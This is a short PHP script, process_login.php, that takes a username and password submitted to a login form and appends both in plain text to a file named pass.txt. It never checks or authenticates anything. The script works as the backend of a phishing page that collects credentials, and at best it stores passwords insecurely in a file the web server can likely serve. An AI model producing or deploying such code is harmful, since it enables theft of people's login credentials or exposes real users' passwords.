<!-- process_login.php -->
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    // Validate and write to a text file
    if ($username !== '' && $password !== '') {
        $file = fopen('pass.txt', 'a');
        if ($file) {
            fwrite($file, "Username: " . htmlspecialchars($username) . "\n");
            fwrite($file, "Password: " . htmlspecialchars($password) . "\n");
            fclose($file);
            echo "Login data written to file successfully.";
        } else {
            echo "Error opening the file.";
        }
    } else {
        echo "Username and password are required.";
    }
}
?>
